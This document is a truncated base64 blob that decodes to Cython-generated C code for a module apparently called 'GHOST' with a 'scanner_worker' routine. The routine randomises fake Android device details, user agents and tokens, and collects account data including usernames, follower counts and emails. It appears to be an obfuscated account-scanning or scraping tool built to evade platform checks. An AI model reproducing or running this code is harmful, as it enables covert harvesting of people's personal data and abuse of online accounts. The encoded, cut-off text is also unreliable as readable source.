F81R0hPU1RfMjVzY2FubmVyX3dvcmtlciA9IHsic2Nhbm5lcl93b3JrZXIiLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJ0dF81R0hPU1RfMjVzY2FubmVyX3dvcmtlciwgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnR0XzVHSE9TVF8yNXNjYW5uZXJfd29ya2VyKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pIHtcbiAgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiA9IDA7XG4gIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3Zfd29ya2VyX2lkID0gMDtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7XG4gICNlbmRpZlxuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0KiB2YWx1ZXNbMl0gPSB7MCwwfTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBQeU9iamVjdCAqX19weXhfciA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJzY2FubmVyX3dvcmtlciAod3JhcHBlcikiLCAwKTtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpO1xuICAjZWxzZVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMO1xuICAjZW5kaWZcbiAgI2VuZGlmXG4gIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpO1xuICB7XG4gICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2VsZiwmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3dvcmtlcl9pZCwwfTtcbiAgICBjb25zdCBQeV9zc2l6ZV90IF9fcHl4X2t3ZHNfbGVuID0gKF9fcHl4X2t3ZHMpID8gX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMKF9fcHl4X2t3ZHMpIDogMDtcbiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDM2MiwgX19weXhfTDNfZXJyb3IpXG4gICAgaWYgKF9fcHl4X2t3ZHNfbGVuID4gMCkge1xuICAgICAgc3dpdGNoIChfX3B5eF9uYXJncykge1xuICAgICAgICBjYXNlICAyOlxuICAgICAgICB2YWx1ZXNbMV0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMSk7XG4gICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzFdKSkgX19QWVhfRVJSKDAsIDM2MiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgY2FzZSAgMTpcbiAgICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApO1xuICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAzNjIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgIGNhc2UgIDA6IGJyZWFrO1xuICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgICAgfVxuICAgICAgY29uc3QgUHlfc3NpemVfdCBrd2RfcG9zX2FyZ3MgPSBfX3B5eF9uYXJncztcbiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJzY2FubmVyX3dvcmtlciIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMzYyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAyOyBpKyspIHtcbiAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZXNbaV0pKSB7IF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJzY2FubmVyX3dvcmtlciIsIDEsIDIsIDIsIGkpOyBfX1BZWF9FUlIoMCwgMzYyLCBfX3B5eF9MM19lcnJvcikgfVxuICAgICAgfVxuICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMikpIHtcbiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgfSBlbHNlIHtcbiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDM2MiwgX19weXhfTDNfZXJyb3IpXG4gICAgICB2YWx1ZXNbMV0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMSk7XG4gICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1sxXSkpIF9fUFlYX0VSUigwLCAzNjIsIF9fcHl4X0wzX2Vycm9yKVxuICAgIH1cbiAgICBfX3B5eF92X3NlbGYgPSB2YWx1ZXNbMF07XG4gICAgX19weXhfdl93b3JrZXJfaWQgPSB2YWx1ZXNbMV07XG4gIH1cbiAgZ290byBfX3B5eF9MNl9za2lwO1xuICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7XG4gIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJzY2FubmVyX3dvcmtlciIsIDEsIDIsIDIsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDM2MiwgX19weXhfTDNfZXJyb3IpXG4gIF9fcHl4X0w2X3NraXA6O1xuICBnb3RvIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lO1xuICBfX3B5eF9MM19lcnJvcjo7XG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0dC5HSE9TVC5zY2FubmVyX3dvcmtlciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIE5VTEw7XG4gIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjtcbiAgX19weXhfciA9IF9fcHl4X3BmXzJ0dF81R0hPU1RfMjRzY2FubmVyX3dvcmtlcihfX3B5eF9zZWxmLCBfX3B5eF92X3NlbGYsIF9fcHl4X3Zfd29ya2VyX2lkKTtcblxuICBcbiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkge1xuICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTtcbiAgfVxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnR0XzVHSE9TVF8yNHNjYW5uZXJfd29ya2VyKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X3NlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3Zfd29ya2VyX2lkKSB7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3VzZXJfaWQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9tb2RlbF9udW1iZXIgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9hbmRyb2lkX3ZlcnNpb24gPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9kcGkgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9yZXNvbHV0aW9uID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfYnJhbmQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9idWlsZF9zdWZmaXggPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl91c2VyX2FnZW50ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfbHNkX3Rva2VuID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfaGVhZGVycyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2RhdGEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9yZXNwb25zZSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3VzZXJfaW5mbyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3VzZXJuYW1lID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZm9sbG93ZXJfY291bnQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9tZWRpYV9jb3VudCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2VtYWlsID0gTlVMTDtcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9lID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7XG4gIHNpemVfdCBfX3B5eF90XzM7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF84ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfOVszXTtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTBbMTVdO1xuICBQeU9iamVjdCAqX19weXhfdF8xMSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzEyID0gTlVMTDtcbiAgaW50IF9fcHl4X3RfMTM7XG4gIGludCBfX3B5eF90XzE0O1xuICBpbnQgX19weXhfdF8xNTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgic2Nhbm5lcl93b3JrZXIiLCAwKTtcblxuICBcbiAgX19weXhfdF8yID0gX19weXhfdl9zZWxmO1xuICBfX1B5eF9JTkNSRUYoX19weXhfdF8yKTtcbiAgX19weXhfdF8zID0gMDtcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0c307XG4gICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5jcmVtZW50X2NvdW50ZXIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDItX19weXhfdF8zKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNjMsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuXG4gIFxuICB7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzQsICZfX3B5eF90XzUsICZfX3B5eF90XzYpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzYpO1xuICAgICB7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8yID0gX19weXhfdl9zZWxmO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMik7XG4gICAgICBfX3B5eF90XzMgPSAwO1xuICAgICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBOVUxMfTtcbiAgICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2VuZXJhdGVfdXNlcl9pZCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8zLCAoMS1fX3B5eF90XzMpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzY1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgICB9XG4gICAgICBfX3B5eF92X3VzZXJfaWQgPSBfX3B5eF90XzE7XG4gICAgICBfX3B5eF90XzEgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzY2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kaW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMzY2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTVdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzY2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3RfMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDM2NiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgX19weXhfdl9tb2RlbF9udW1iZXIgPSAoKFB5T2JqZWN0KilfX3B5eF90XzIpO1xuICAgICAgX19weXhfdF8yID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzEgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzNjcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nob2ljZSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDM2NywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNyA9IFB5TGlzdF9OZXcoNik7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDM2OCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzIzXzZfMCk7XG4gICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjNfNl8wKTtcbiAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF83LCAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzIzXzZfMCkgIT0gKDApKSBfX1BZWF9FUlIoMCwgMzY4LCBfX3B5eF9MM19lcnJvcik7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yNF83XzApO1xuICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI0XzdfMCk7XG4gICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfNywgMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yNF83XzApICE9ICgwKSkgX19QWVhfRVJSKDAsIDM2OCwgX19weXhfTDNfZXJyb3IpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjVfN18xXzEpO1xuICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI1XzdfMV8xKTtcbiAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF83LCAyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI1XzdfMV8xKSAhPSAoMCkpIF9fUFlYX0VSUigwLCAzNjgsIF9fcHl4X0wzX2Vycm9yKTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI2XzhfMCk7XG4gICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjZfOF8wKTtcbiAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF83LCAzLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI2XzhfMCkgIT0gKDApKSBfX1BZWF9FUlIoMCwgMzY4LCBfX3B5eF9MM19lcnJvcik7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yN184XzEpO1xuICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI3XzhfMSk7XG4gICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfNywgNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yN184XzEpICE9ICgwKSkgX19QWVhfRVJSKDAsIDM2OCwgX19weXhfTDNfZXJyb3IpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjhfOV8wKTtcbiAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yOF85XzApO1xuICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzcsIDUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjhfOV8wKSAhPSAoMCkpIF9fUFlYX0VSUigwLCAzNjgsIF9fcHl4X0wzX2Vycm9yKTtcbiAgICAgIF9fcHl4X3RfMyA9IDE7XG4gICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF84KSkpIHtcbiAgICAgICAgX19weXhfdF8xID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF84KTtcbiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfMSk7XG4gICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF84KTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMSk7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfOCwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19weXhfdF8zID0gMDtcbiAgICAgIH1cbiAgICAgICNlbmRpZlxuICAgICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xLCBfX3B5eF90Xzd9O1xuICAgICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKV9fcHl4X3RfOCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8zLCAoMi1fX3B5eF90XzMpIHwgKF9fcHl4X3RfMypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDM2NywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgICAgfVxuICAgICAgX19weXhfdl9hbmRyb2lkX3ZlcnNpb24gPSBfX3B5eF90XzI7XG4gICAgICBfX3B5eF90XzIgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMzY5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kaW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMzY5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTZdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMzY5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3RfMik7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDM2OSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgX19weXhfdl9kcGkgPSAoKFB5T2JqZWN0KilfX3B5eF90XzgpO1xuICAgICAgX19weXhfdF84ID0gMDtcblxuICAgICAgXG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDM3MCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZGludCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDM3MCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF9